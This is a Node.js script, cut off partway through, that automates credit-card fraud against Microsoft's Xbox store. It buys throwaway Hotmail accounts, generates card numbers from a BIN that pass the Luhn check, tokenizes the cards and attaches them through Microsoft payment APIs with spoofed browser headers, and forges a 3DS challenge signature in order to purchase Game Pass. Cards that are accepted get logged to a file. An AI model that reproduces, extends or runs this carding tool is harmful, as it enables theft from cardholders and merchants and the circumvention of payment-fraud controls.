const { xboxLogin, msLogin } = require("./auth.js");
const chalk = require("chalk");
const dns = require("dns/promises");
const fs = require("fs");
const crypto = require("crypto");
const qs = require("qs");
const readline = require("readline/promises");
const config = require("./config.json");
const { exec } = require('child_process');
const os = require("os");
const request = require("request");

if (process.argv.includes('-tls')) {
    process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
}

const luhnCheck = (cardNumber) => {
    let sum = 0;
    for (let i = 0; i < cardNumber.length; i++) {
        let digit = parseInt(cardNumber.charAt(i));
        if (i % 2 == 0) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        sum += digit;
    }
    return sum % 10 == 0;
}

const generateCardNumber = (bin) => {
    if (!bin.match(/^\d+/g)) throw new Error("Invalid BIN");
    let prefixLen = bin.match(/^\d+/g)[0].length;

    let len = 16 - prefixLen;

    let cards = [];

    for (let i = 0; i < 10 ** len; i++) {
        let ccNumber = `${bin.substring(0, prefixLen)}${i.toString().padStart(len, "0")}`;
        if (luhnCheck(ccNumber)) cards.push(ccNumber);
    }

    return cards;
}

process.on('unhandledRejection', (reason, promise) => {
    console.log(`[${chalk.red('!')}] An error has occured. Logs have been saved to ${chalk.cyan('error.log')}`);
    fs.writeFileSync('error.log', JSON.stringify(reason));
});

process.on('uncaughtException', (err) => {
    console.log(`[${chalk.red('!')}] An error has occured. Logs have been saved to ${chalk.cyan('error.log')}`);
    fs.writeFileSync('error.log', JSON.stringify(err));
});

let running = true;

process.on('SIGINT', () => {
    if (running) {
        console.log(`[${chalk.red('!')}] Stopping threads... Press CTRL+C again to exit`);
        running = false;
    } else {
        process.exit(0);
    }
});

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function generateKey() {
    return new Promise((resolve, reject) => {
        crypto.generateKey("hmac", { length: 512 }, (err, key) => {
            if (err) reject (err); else resolve(key);
        });
    });
}

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}

let productId = '';
let skuId = '';
let cards = [];

async function generate() {
    const { fetch, CookieJar } = await import('node-fetch-cookies');
    const { default: nodefetch } = await import("node-fetch");
    const Hotmailbox = await import('hotmailbox');

    const client = new Hotmailbox.API(config.hotmailbox);

    if (cards.length === 0) return; 

    let card = cards.shift();

    const cookieJar = new CookieJar();
    const goods = await client.buyEmails("HOTMAIL", 1).catch(() => {});

    if (!goods.Emails) {
        console.log(`[${chalk.red('-')}] Email purchase failed`);
        return;
    }

    const email = goods.Emails[0].Email;
    const password = goods.Emails[0].Password;
    console.log(`[${chalk.yellow('~')}] Starting thread... ${email}:${password}`);
    
    const loggedin = await xboxLogin(cookieJar, email, password)
    .catch(() => null);

    if (!loggedin) {
        console.log(`[${chalk.red('!')}] ${email}:${password} - Login failed`);
        return;
    }

    console.log(`[${chalk.green('~')}] ${email}:${password} - Logged in`);

    const _mpMsToken = JSON.parse(decodeURIComponent(cookieJar.cookies.get('xbox.com').get('XBXXtkhttp://mp.microsoft.com/').value));
    const mpMsCookie = `XBL3.0 x=${_mpMsToken.UserClaims.uhs};${_mpMsToken.Token}`;

    let languageCode = card.countryCode;
    let market = languageCode.split('-')[1].toLowerCase();

    const xboxPage = await fetch(cookieJar, `https://www.xbox.com/${languageCode}/xbox-game-pass`, {
        method: "GET",
        headers: { 
            'Accept-Language': ' en-US,en;q=0.9', 
            'Cache-Control': ' max-age=0',
            'DNT': ' 1', 
            'Referer': ` https://www.xbox.com/${languageCode}/xbox-game-pass`, 
            'Sec-Fetch-Dest': ' document', 
            'Sec-Fetch-Mode': ' navigate', 
            'Sec-Fetch-Site': ' same-origin', 
            'Sec-Fetch-User': ' ?1', 
            'Upgrade-Insecure-Requests': ' 1', 
            'sec-ch-ua': ' "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"', 
            'sec-ch-ua-mobile': ' ?0', 
            'sec-ch-ua-platform': ' "Windows"'
        }
    }).then(res => res.text());

    const anonToken = xboxPage.match(/"anonToken":"([\w\-.]+)"/)[1];

    const sessionIdPrefix = makeid(22);
    const buySession = `${sessionIdPrefix}.15`;

    const productResponse = await nodefetch(`https://emerald.xboxservices.com/xboxcomfd/contextualStore/productDetails/CFQ7TTC0KHS0?locale=${languageCode}`, {
        headers: {
            'authority': 'emerald.xboxservices.com', 
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9', 
            'authorization': mpMsCookie,
            'dnt': '1',
            'ms-cv': buySession,
            'origin': 'https://www.xbox.com', 
            'referer': 'https://www.xbox.com/', 
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"', 
            'sec-ch-ua-mobile': '?0', 
            'sec-ch-ua-platform': '"Windows"', 
            'sec-fetch-dest': 'empty', 
            'sec-fetch-mode': 'cors', 
            'sec-fetch-site': 'cross-site', 
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 
            'x-ms-api-version': '1.0', 
            'x-s2s-authorization': `Bearer ${anonToken}`
        }
    }).then(res => res.json());

    const buynow = await fetch(cookieJar, `https://www.microsoft.com/store/buynow?ms-cv=${buySession}&noCanonical=true&market=${market}&locale=${languageCode}`, {
        headers: {
            'authority': 'www.microsoft.com', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
            'accept-language': 'en-US,en;q=0.9', 
            'cache-control': 'max-age=0', 
            'content-type': 'application/x-www-form-urlencoded', 
            'dnt': '1', 
            'origin': 'https://www.xbox.com', 
            'referer': 'https://www.xbox.com/', 
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"', 
            'sec-ch-ua-mobile': '?0', 
            'sec-ch-ua-platform': '"Windows"', 
            'sec-fetch-dest': 'iframe', 
            'sec-fetch-mode': 'navigate', 
            'sec-fetch-site': 'cross-site', 
            'sec-fetch-user': '?1', 
            'upgrade-insecure-requests': '1', 
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
        },
        body: qs.stringify({
            data: JSON.stringify({
                products: [
                    {
                        productId,
                        skuId,
                        availabilityId:productResponse.availabilitySummaries[0].availabilityId
                    }
                ],
                campaignId: "xboxcomct",
                callerApplicationId: "XboxCom",
                expId: ["EX:sc_xboxgamepad","EX:sc_xboxspinner","EX:sc_xboxclosebutton","EX:sc_xboxuiexp","EX:sc_disabledefaultstyles","EX:sc_gamertaggifting"],
                flights: ["sc_xboxgamepad","sc_xboxspinner","sc_xboxclosebutton","sc_xboxuiexp","sc_disabledefaultstyles","sc_gamertaggifting"],
                clientType: "XboxCom",
                data: {
                    usePurchaseSdk: true
                },
                layout: "Modal",
                cssOverride: "XboxCom2NewUI",
                theme: "light",
                scenario: "",
                suppressGiftThankYouPage: false
            }),
            auth: JSON.stringify({
                XToken: mpMsCookie
            })
        }),
        method: "POST"
    }).then(res => res.text());

    const MUID = cookieJar.cookies.get('microsoft.com').get('MUID').value;

    const riskId = buynow.match(/"riskId":"([\w-]+)"/)[1];
    const cartId = buynow.match(/"cartId":"([\w-]+)"/)[1];
    const vectorId = buynow.match(/"vectorId":"([\w]+)"/)[1];

    const paymentMethodDescriptions = await nodefetch(`https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentMethodDescriptions?type=visa%2Camex%2Cmc&partner=webblends&orderId=${cartId}&operation=Add&country=${market}&language=${languageCode}&family=credit_card&completePrerequisites=true`, {
        headers: {
            'Accept': '*/*', 
            'Accept-Language': 'en-US,en;q=0.9', 
            'Connection': 'keep-alive', 
            'DNT': '1', 
            'Origin': 'https://www.microsoft.com', 
            'Referer': 'https://www.microsoft.com/', 
            'Sec-Fetch-Dest': 'empty', 
            'Sec-Fetch-Mode': 'cors', 
            'Sec-Fetch-Site': 'same-site', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 
            'authorization': mpMsCookie,
            'content-type': 'application/json', 
            'correlation-context': 'v=1,ms.b.tel.scenario=commerce.payments.PaymentInstrumentAdd.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=CAmKfeBH7jDNHSERZlOz21', 
            'ms-cv': buySession, 
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 
            'sec-ch-ua-mobile': '?0', 
            'sec-ch-ua-platform': '"Windows"', 
            'x-ms-flight': 'EnableThreeDSOne', 
            'x-ms-pidlsdk-version': '1.22.0_reactview'
        }
    }).then(res => res.json());

    const { id: addressId } = await nodefetch("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/addresses", {
        method: "POST",
        headers: {
            'Authorization': mpMsCookie,
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'ms-cv': buySession
        },
        body: JSON.stringify({
            addressType: "billing",
            addressCountry: market,
            address_line1: config.address.line1,
            city: config.address.city,
            region: config.address.region,
            postal_code: config.address.postal_code,
            country: market
        })
    }).then(res => res.json());

    let paymentInstrumentId = '';
    let accountId = '';

    for (let i = 0; i < config.attemptsPerAccount; i++) {
        console.log(`[${chalk.blue('~')}] Attempting to add card ${card.cardNumber}... (${email})`)

        const key = await generateKey();
        
        let _cardNumber = card.cardNumber;
        let _expMonth = card.expMonth.replace(/^0+/, '');
        let _expYear = card.expYear;
        let _cvc = card.cvv;

        const [ { data: panToken }, { data: cvvToken }, { data: keyToken } ] = await Promise.all([
            nodefetch("https://tokenization.cp.microsoft.com/tokens/pan/getToken", {
                method: "POST",
                headers: {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'DNT': '1',
                    'Origin': 'https://www.microsoft.com',
                    'Referer': 'https://www.microsoft.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    'content-type': 'application/json',
                    'ms-cv': buySession,
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                },
                body: JSON.stringify({
                    data: _cardNumber
                })
            }).then(res => res.json()),
            nodefetch("https://tokenization.cp.microsoft.com/tokens/cvv/getToken", {
                method: "POST",
                headers: {
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'DNT': '1',
                    'Origin': 'https://www.microsoft.com',
                    'Referer': 'https://www.microsoft.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                    'content-type': 'application/json',
                    'ms-cv': buySession,
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"'
                },
                body: JSON.stringify({
                    data: _cvc
                })
            }).then(res => res.json()),
            nodefetch("https://tokenization.cp.microsoft.com/tokens/piAuthKey/getToken", {
                method: "POST",
                headers: {
                    'Accept': '*/*', 
                    'Accept-Language': 'en-US,en;q=0.9', 
                    'Connection': 'keep-alive', 
                    'DNT': '1', 
                    'Origin': 'https://www.microsoft.com', 
                    'Referer': 'https://www.microsoft.com/', 
                    'Sec-Fetch-Dest': 'empty', 
                    'Sec-Fetch-Mode': 'cors', 
                    'Sec-Fetch-Site': 'same-site', 
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36', 
                    'content-type': 'application/json', 
                    'ms-cv': buySession, 
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"', 
                    'sec-ch-ua-mobile': '?0', 
                    'sec-ch-ua-platform': '"Windows"'
                },
                body: JSON.stringify({
                    data: key.export().toString('base64')
                })
            }).then(res => res.json())
        ]);

        const payment = await nodefetch(`https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?country=${market}&language=${languageCode}&partner=webblends&completePrerequisites=True`, {
            method: 'POST',
            headers: {
                authorization: mpMsCookie,
                'content-type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
            },
            body: JSON.stringify({
                paymentMethodFamily: "credit_card",
                paymentMethodType: _cardNumber.startsWith('4') ? 'visa' : 'mc',
                paymentMethodOperation: "add",
                paymentMethodCountry: market,
                paymentMethodResource_id: `credit_card.${_cardNumber.startsWith('4') ? 'visa' : 'mc'}`,
                sessionId: crypto.randomUUID(),
                context: "purchase",
                riskData: {
                    dataType: "payment_method_riskData",
                    dataOperation: "add",
                    dataCountry: market,
                    greenId: riskId
                },
                details: {
                    dataType: `credit_card_${_cardNumber.startsWith('4') ? 'visa' : 'mc'}_details`,
                    dataOperation: "add",
                    dataCountry: market,
                    accountHolderName: "Jaemin Jung",
                    accountToken: panToken,
                    expiryMonth: _expMonth,
                    expiryYear: _expYear,
                    cvvToken,
                    address: {
                        addressType: "billing",
                        addressOperation: "add",
                        addressCountry: market,
                        address_line1: config.address.line1,
                        city: config.address.city,
                        region: config.address.region,
                        postal_code: card.postalCode,
                        country: market
                    },
                    permission: {
                        dataType: "permission_details",
                        dataOperation: "add",
                        dataCountry: market,
                        hmac: {
                            algorithm: "hmacsha256",
                            keyToken,
                            data: crypto.createHmac('sha256', key).update(`Pan:${_cardNumber}|HMACKey:${key.export().toString('base64')}|UserCredential:${mpMsCookie}`).digest('base64')
                        },
                        userCredential: mpMsCookie
                    }
                },
                pxmac: paymentMethodDescriptions[0].data_description.pxmac.default_value
            })
        }).then(res => res.json());

        if (payment.id) {
            paymentInstrumentId = payment.id;
            accountId = payment.accountId;
            break;
        }
        
        console.log(`[${chalk.redBright('-')}] Failed to add card ${card.cardNumber} (${payment.code} / ${payment.innererror.code}, ${payment.innererror.message}) / ${email})`);
        if (cards.length === 0) {
            console.log(`[${chalk.red('-')}] Out of card (${email})`);
            return;
        }
        card = cards.shift();
    }
    
    if (paymentInstrumentId === '') {
        console.log(`[${chalk.redBright('-')}] attempts over (${email})`);
        return;
    }

    fs.appendFileSync("./added-ccs.txt", `${card}\n`);
    console.log(`[${chalk.greenBright('+')}] Added card ${card} (${email})`);

    const trackId = crypto.randomUUID();
    const correlationId = crypto.randomUUID();

    await nodefetch(`https://cart.production.store-web.dynamics.com/cart/v1.0/cart/updateCart?cartId=${cartId}&appId=BuyNow`, {
        method: 'PUT',
        headers: {
            'authorization': mpMsCookie,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'X-Authorization-Muid': MUID,
            'X-MS-Correlation-ID': correlationId,
            'x-MS-Vendor-Id': vectorId,
            'x-ms-tracking-id': trackId,
            'content-type': 'application/json',
            'ms-cv': buySession
        },
        body: JSON.stringify({
            "locale": languageCode,
            market,
            "catalogClientType": "",
            "clientContext": {
                "client": "XboxCom",
                "deviceFamily": "Web"
            },
            "flights": [
                "sc_subscriptioncanceldisclaimer",
                "sc_appendconversiontype",
                "sc_showvalidpis",
                "sc_scdstextdirection",
                "sc_optimizecheckoutload",
                "sc_purchasedblockedby",
                "sc_passthroughculture",
                "sc_showcanceldisclaimerdefaultv1",
                "sc_redirecttosignin",
                "sc_paymentpickeritem",
                "sc_cleanreducercode",
                "sc_dimealipaystylingfix",
                "sc_promocode",
                "sc_onedrivedowngrade",
                "sc_buynowusagerules",
                "sc_newooslogiconcart",
                "sc_optionalcatalogclienttype",
                "sc_klarna",
                "sc_hidecontactcheckbox",
                "sc_preparecheckoutrefactor",
                "sc_checkoutklarna",
                "sc_currencyformattingpkg",
                "sc_fullpageredirectionforasyncpi",
                "sc_xaaconversionerror",
                "sc_promocodefeature-web-desktop",
                "sc_eligibilityproducts",
                "sc_disabledpaymentoption",
                "sc_enablecartcreationerrorparsing",
                "sc_purchaseblock",
                "sc_returnoospsatocart",
                "sc_dynamicseligibility",
                "sc_usebuynowonlyinternalendpoint",
                "sc_removemoreless",
                "sc_renewalsubscriptionselector",
                "sc_hidexdledd",
                "sc_militaryshippingurl",
                "sc_xboxdualleaf",
                "sc_multiplesubscriptions",
                "sc_loweroriginalprice",
                "sc_xaatovalenciastring",
                "sc_cannotbuywarrantyalone",
                "sc_showminimalfooteroncheckout",
                "sc_checkoutdowngrade",
                "sc_checkoutcontainsiaps",
                "sc_localizedtax",
                "sc_officescds",
                "sc_disableupgradetrycheckout",
                "sc_custombuynowbutton",
                "sc_extendPageTagToOverride",
                "sc_checkoutscenariotelemetry",
                "sc_skipselectpi",
                "sc_allowmpesapi",
                "sc_purchasestatusmessage",
                "sc_storetermslink",
                "sc_newmovielegalstrings",
                "sc_argentinatransactionfee",
                "sc_skipsetdefaultpaymentoption",
                "sc_postorderinfolineitemmessage",
                "sc_addpaymentfingerprinttagging",
                "sc_shippingallowlist",
                "sc_emptyresultcheck",
                "sc_newcheckoutselector",
                "sc_dualleaf",
                "sc_riskyxtoken",
                "sc_abandonedretry",
                "sc_testflightbuynow",
                "sc_addshippingmethodtelemetry",
                "sc_leaficons",
                "sc_newspinneroverlay",
                "sc_paymentinstrumenttypeandfamily",
                "sc_addsitename",
                "sc_disallowalipayforcheckout",
                "sc_checkoutsignintelemetry",
                "sc_prominenteddchange",
                "sc_disableshippingaddressinit",
                "sc_preparecheckoutperf",
                "sc_zipplusfourselectaddress",
                "sc_buynowctatext",
                "sc_buynowuiprod",
                "sc_showooserrorforoneminute",
                "sc_proratedrefunds",
                "sc_entitlementcheckallitems",
                "sc_indiaregsbanner",
                "sc_checkoutentitlement",
                "sc_rspv2",
                "sc_focustrapforgiftthankyoupage",
                "sc_hideneedhelp",
                "sc_defaultshippingref",
                "sc_uuid",
                "sc_checkoutasyncpurchase",
                "sc_nativeclientlinkredirect",
                "sc_enablelegalrequirements",
                "sc_expanded.purchasespinner",
                "sc_valenciaupgrade",
                "sc_enablezipplusfour",
                "sc_handleentitlementerror",
                "sc_alwayscartmuid",
                "sc_sharedupgrade",
                "sc_mwfbuynow",
                "sc_checkoutloadspinner",
                "sc_xaaconversionexpirationdate",
                "sc_trimerrorcode",
                "sc_newdemandsandneedsstatement",
                "sc_citizensoneallowed",
                "sc_riskfatal",
                "sc_renewtreatmenta",
                "sc_trialtreatmenta",
                "sc_cartzoomfix",
                "sc_useofficeonlyinternalendpoint",
                "sc_gotopurchase",
                "sc_endallactivities",
                "sc_headingheader",
                "sc_flexsubs",
                "sc_useanchorcomponent",
                "sc_addbillingaddresstelemetry",
                "sc_scenariotelemetryrefactor",
                "sc_checkoutsmd",
                "sc_scenariosupportupdate",
                "sc_bankchallengecheckout",
                "sc_addpiriskdata",
                "sc_addpaymenttelemetry",
                "sc_railv2",
                "sc_checkoutglobalpiadd",
                "sc_reactcheckout",
                "sc_xboxgotocart",
                "sc_hidewarningevents",
                "sc_xboxcomnosapi",
                "sc_contextpreparecheckout",
                "sc_clientdebuginfo",
                "sc_routebacktocartforoutofstock",
                "sc_koreanlegalterms",
                "sc_updateresourcefix",
                "sc_paymentoptionnotfound",
                "sc_pidlflights",
                "sc_fixcolorcontrastforrecommendeditems",
                "sc_hideeditbuttonwhenediting",
                "sc_enablekakaopay",
                "sc_ordercheckoutfix",
                "sc_xboxpmgrouping",
                "sc_stickyfooter",
                "sc_gotoredmrepl",
                "sc_partnernametelemetry",
                "sc_turnoffmwfbuynow",
                "sc_jpregionconversion",
                "sc_checkoutorderedpv",
                "sc_officebeta",
                "sc_maxaddresslinelength",
                "sc_componentexception",
                "sc_buynowuipreload",
                "sc_updatebillinginfo",
                "sc_newshippingmethodtelemetry",
                "sc_checkoutbannertelemetry",
                "sc_learnmoreclcid",
                "sc_satisfiedcheckout",
                "sc_newlegaltextlayout",
                "sc_newpagetitle",
                "sc_prepaidcardsv3",
                "sc_gamertaggifting",
                "sc_checkoutargentinafee",
                "sc_xboxcomasyncpurchase",
                "sc_sameaddressdefault",
                "sc_fixcolorcontrastforcheckout",
                "sc_checkboxkg",
                "sc_usebuynowbusinesslogic",
                "sc_skippurchaseconfirm",
                "sc_activitymonitorasyncpurchase",
                "sc_shareddowngrade",
                "sc_allowedpisenabled",
                "sc_xboxoos",
                "sc_eligibilityapi",
                "sc_koreatransactionfeev1",
                "sc_removesetpaymentmethod",
                "sc_ordereditforincompletedata",
                "sc_cppidlerror",
                "sc_bankchallenge",
                "sc_allowelo",
                "sc_delayretry",
                "sc_postmessageforesckey",
                "sc_loadtestheadersenabled",
                "sc_migrationforcitizenspay",
                "sc_conversionblockederror",
                "sc_allowpaysafecard",
                "sc_protectionplanstrings",
                "sc_purchasedblocked",
                "sc_outofstock",
                "sc_selectpmonaddfailure",
                "sc_allowcustompifiltering",
                "sc_updatedfamilystrings",
                "sc_errorpageviewfix",
                "sc_xboxredirection",
                "sc_usebuynowonlynonprodendpoint",
                "sc_getmoreinfourl",
                "sc_disablefilterforuserconsent",
                "sc_suppressrecoitem",
                "sc_dcccattwo",
                "sc_hipercard",
                "sc_resellerdetail",
                "sc_fixpidladdpisuccess",
                "sc_inpageaddpifailure",
                "sc_xdlshipbuffer",
                "sc_allowverve",
                "sc_inlinetempfix",
                "sc_ineligibletostate",
                "sc_greenshipping",
                "sc_koreatransactionfee",
                "sc_custombuynowcheckbox",
                "sc_trackinitialcheckoutload",
                "sc_filterasyncpisforgifting",
                "sc_creditcardpurge",
                "sc_showlegalstringforproducttypepass",
                "sc_newduplicatesubserror",
                "sc_xboxgamepad",
                "sc_xboxspinner",
                "sc_xboxclosebutton",
                "sc_xboxuiexp",
                "sc_disabledefaultstyles",
                "sc_gamertaggifting"
            ],
            paymentInstrumentId,
            "csvTopOffPaymentInstrumentId": null,
            "billingAddressId": {
                "accountId": accountId,
                "id": addressId
            },
            "sessionId": riskId,
            "orderState": "CHECKINGOUT"
        })
    });

    await fetch(cookieJar, `https://paymentinstruments.mp.microsoft.com/v6.0/users/me/PaymentSessionDescriptions?paymentSessionData=${
        JSON.stringify({
            piid: paymentInstrumentId,
            language: languageCode, //ko-KR
            partner: "webblends",
            piCid: accountId,
            amount: productResponse.availabilitySummaries[0].price.msrp,
            currency: productResponse.availabilitySummaries[0].price.currency,
            country: market,
            hasPreOrder: "false",
            challengeScenario: "RecurringTransaction",
            challengeWindowSize: "03",
            purchaseOrderId: cartId
        })}`,
    {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
            authorization: mpMsCookie,
            "correlation-context": `v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=${sessionIdPrefix}/R`,
            "ms-cv": `${sessionIdPrefix}/R.24.3`,
            "x-ms-flight": "EnableThreeDSOne",
            "x-ms-pidlsdk-version": "1.22.9_reactview"
        }
    });

    const _signature = crypto.randomUUID();

    await fetch(cookieJar, `https://paymentinstruments.mp.microsoft.com/v6.0/users/me/challengeDescriptions?timezoneOffset=-540&paymentSessionOrData=${encodeURIComponent(JSON.stringify({
        id: _signature,
        isChallengeRequired: true,
        signature: `placeholder_for_paymentsession_signature_${_signature}`,
        challengeStatus: "Unknown",
        challengeType: "ValidatePIOnAttachChallenge",
        piid: paymentInstrumentId,
        language: languageCode, // ko-KR
        partner: "webblends",
        piCid: accountId,
        amount: productResponse.availabilitySummaries[0].price.msrp,
        currency: productResponse.availabilitySummaries[0].price.currency,
        country: market,
        hasPreOrder: false,
        isLegacy: false,
        isMOTO: false,
        challengeScenario: "RecurringTransaction",
        challengeWindowSize: "03",
        purchaseOrderId: cartId,
        cv: `${sessionIdPrefix}/R.24.3`
    }))}&operation=RenderPidlPage`, {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
            authorization: mpMsCookie,
            "correlation-context": `v=1,ms.b.tel.scenario=commerce.payments.PaymentSessioncreatePaymentSession.1,ms.b.tel.partner=XboxCom,ms.c.cfs.payments.partnerSessionId=${sessionIdPrefix}/R`,
            "ms-cv": `${sessionIdPrefix}/R.24.3`,
            "x-ms-flight": "EnableThreeDSOne",
            "x-ms-pidlsdk-version": "1.22.9_reactview"
        }
    });

    console.log(`[${chalk.blueBright('~')}] Payment in progress ${card} (${email})`);

    const purchaseStatus = await nodefetch("https://cart.production.store-web.dynamics.com/cart/v1.0/Cart/purchase?appId=BuyNow", {
        headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0',
            'Authorization': mpMsCookie,
            'X-Authorization-Muid': MUID,
            'X-MS-Correlation-ID': correlationId,
            'X-MS-Vector-Id': vectorId,
            'x-ms-tracking-id': trackId,
            'content-type': 'application/json',
            'ms-cv': `${sessionIdPrefix}/R.24.3`
        },
        method: 'POST',
        body: JSON.stringify({
            cartId,
            market,
            locale: languageCode,
            catalogClientType: "",
            callerApplicationId: "_CONVERGED_XboxCom",
            clientContext: {
              client: "XboxCom",
              deviceFamily: "Web"
            },
            paymentSessionId: riskId,
            riskChallengeData: {
                type: "threeds2",
                data: _signature
            },
            paymentInstrumentId,
            paymentInstrumentType: cardNumber.startsWith('4') ? 'visa' : 'mc',
            email,
            csvTopOffPaymentInstrumentId: null,
            billingAddressId: {
                accountId,
                id: addressId
            },
            currentOrderState: "CheckingOut",
            flights: [
                "sc_appendconversiontype",
                "sc_updatectatextandenablenextbutton",
                "sc_showvalidpis",
                "sc_scdstextdirection",
                "sc_optimizecheckoutload",
                "sc_purchasedblockedby",
                "sc_passthroughculture",
                "sc_showcanceldisclaimerdefaultv1",
                "sc_redirecttosignin",
                "sc_paymentpickeritem",
                "sc_cleanreducercode",
                "sc_dimealipaystylingfix",
                "sc_promocode",
                "sc_onedrivedowngrade",
                "sc_newooslogiconcart",
                "sc_newsapiexemptclientcheck",
                "sc_optionalcatalogclienttype",
                "sc_klarna",
                "sc_hidecontactcheckbox",
                "sc_preparecheckoutrefactor",
                "sc_checkoutklarna",
                "sc_currencyformattingpkg",
                "sc_fullpageredirectionforasyncpi",
                "sc_xaaconversionerror",
                "sc_promocodefeature-web-desktop",
                "sc_eligibilityproducts",
                "sc_disabledpaymentoption",
                "sc_enablecartcreationerrorparsing",
                "sc_purchaseblock",
                "sc_returnoospsatocart",
                "sc_dynamicseligibility",
                "sc_usebuynowonlyinternalendpoint",
                "sc_removemoreless",
                "sc_renewalsubscriptionselector",
                "sc_iframesandboxtag",
                "sc_hidexdledd",
                "sc_militaryshippingurl",
                "sc_xboxdualleaf",
                "sc_japanlegalterms",
                "sc_multiplesubscriptions",
                "sc_loweroriginalprice",
                "sc_xaatovalenciastring",
                "sc_cannotbuywarrantyalone",
                "sc_showminimalfooteroncheckout",
                "sc_checkoutdowngrade",
                "sc_checkoutcontainsiaps",
                "sc_localizedtax",
                "sc_officescds",
                "sc_disableupgradetrycheckout",
                "sc_extendPageTagToOverride",
                "sc_checkoutscenariotelemetry",
                "sc_mcupgrade",
                "sc_skipselectpi",
                "sc_allowmpesapi",
                "sc_purchasestatusmessage",
                "sc_storetermslink",
                "sc_checkoutsurvey",
                "sc_returnifsigninrequire",
                "sc_postorderinfolineitemmessage",
                "sc_addpaymentfingerprinttagging",
                "sc_shippingallowlist",
                "sc_emptyresultcheck",
                "sc_dualleaf",
                "sc_riskyxtoken",
                "sc_abandonedretry",
                "sc_testflightbuynow",
                "sc_addshippingmethodtelemetry",
                "sc_leaficons",
                "sc_newspinneroverlay",
                "sc_paymentinstrumenttypeandfamily",
                "sc_addsitename",
                "sc_disallowalipayforcheckout",
                "sc_checkoutsignintelemetry",
                "sc_prominenteddchange",
                "sc_disableshippingaddressinit",
                "sc_preparecheckoutperf",
                "sc_buynowctatext",
                "sc_buynowuiprod",
                "sc_checkoutsalelegaltermsjp",
                "sc_showooserrorforoneminute",
                "sc_proratedrefunds",
                "sc_entitlementcheckallitems",
                "sc_checkoutentitlement",
                "sc_rspv2",
                "sc_focustrapforgiftthankyoupage",
                "sc_hideneedhelp",
                "sc_defaultshippingref",
                "sc_uuid",
                "sc_checkoutasyncpurchase",
                "sc_hideexpirydateforindiamarket",
                "sc_nativeclientlinkredirect",
                "sc_enablelegalrequirements",
                "sc_expanded.purchasespinner",
                "sc_valenciaupgrade",
                "sc_enablezipplusfour",
                "sc_giftingtelemetryfix",
                "sc_handleentitlementerror",
                "sc_alwayscartmuid",
                "sc_sharedupgrade",
                "sc_checkoutloadspinner",
